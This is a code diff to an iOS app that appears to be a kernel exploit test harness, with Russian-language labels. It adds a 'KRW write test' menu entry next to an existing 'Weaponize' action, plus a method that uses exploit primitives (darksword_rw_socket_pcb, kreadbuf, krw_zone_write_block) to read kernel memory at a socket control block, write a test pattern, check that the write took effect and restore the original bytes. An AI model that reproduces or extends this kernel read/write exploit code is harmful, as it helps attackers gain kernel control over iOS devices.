@@ -495,6 +495,11 @@
                                             handler:^(UIAlertAction *a) {
         [weakSelf runWeaponize];
     }]];
+    [sheet addAction:[UIAlertAction actionWithTitle:@"KRW write test (no Glyph)"
+                                              style:UIAlertActionStyleDefault
+                                            handler:^(UIAlertAction *a) {
+        [weakSelf runKrwWriteTest];
+    }]];
     [sheet addAction:[UIAlertAction actionWithTitle:@"Отмена" style:UIAlertActionStyleCancel handler:nil]];
     [self presentViewController:sheet animated:YES completion:nil];
 }
@@ -693,6 +698,51 @@
             [[KPLog shared] append:report];
             self.statusLabel.text = @"Weaponize завершён — см. лог";
             [self saveExperimentReport:report fileName:@"kexproof-weaponize.txt"];
+            self.jobRunning = NO;
+            [self updateExperimentButtons];
+        });
+    });
+}
+
+- (void)runKrwWriteTest {
+    if (![self beginJob]) return;
+    self.statusLabel.text = @"KRW write test (clean heap)…";
+    [[KPLog shared] append:@"[RESULT] KRW write test — запуск"];
+    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
+        NSMutableString *r = [NSMutableString string];
+        [r appendString:@"\n=== KRW write test (no Glyph, clean heap) ===\n"];
+        extern uint64_t darksword_rw_socket_pcb(void);
+        extern void krw_zone_write_block(uint64_t where, const uint8_t *buf);
+        uint64_t pcb = darksword_rw_socket_pcb();
+        if (pcb && gPrimitives.kreadbuf) {
+            [r appendFormat:@"  darksword pcb = 0x%016llx\n", pcb];
+            uint8_t orig[32] = {0};
+            gPrimitives.kreadbuf(pcb + 0x150, orig, 32);
+            [r appendFormat:@"  pcb+0x150 read: %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                orig[0], orig[1], orig[2], orig[3], orig[4], orig[5], orig[6], orig[7]];
+            uint8_t testBlock[32];
+            memset(testBlock, 0x41, 32);
+            *(uint64_t *)testBlock = 0x1122334455667788ULL;
+            krw_zone_write_block(pcb + 0x150, testBlock);
+            uint8_t readBack[32] = {0};
+            gPrimitives.kreadbuf(pcb + 0x150, readBack, 32);
+            [r appendFormat:@"  pcb+0x150 readback: %02x %02x %02x %02x %02x %02x %02x %02x (expect 88 77 66 55)\n",
+                readBack[0], readBack[1], readBack[2], readBack[3], readBack[4], readBack[5], readBack[6], readBack[7]];
+            if (*(uint64_t *)readBack == 0x1122334455667788ULL) {
+                [r appendString:@"  >>> KRW WRITE VERIFIED via krw_zone_write_block!\n"];
+                [r appendString:@"  >>> type 0x21 path confirmed — proc is writable\n"];
+            } else {
+                [r appendString:@"  >>> KRW write did not persist\n"];
+            }
+            krw_zone_write_block(pcb + 0x150, orig);
+            [r appendString:@"  restored original block\n"];
+        } else {
+            [r appendString:@"  darksword pcb or kreadbuf not available — run pe_v1 first\n"];
+        }
+        dispatch_async(dispatch_get_main_queue(), ^{
+            [[KPLog shared] append:r];
+            self.statusLabel.text = @"KRW write test завершён — см. лог";
+            [self saveExperimentReport:r fileName:@"kexproof-krw-write-test.txt"];
             self.jobRunning = NO;
             [self updateExperimentButtons];
         });
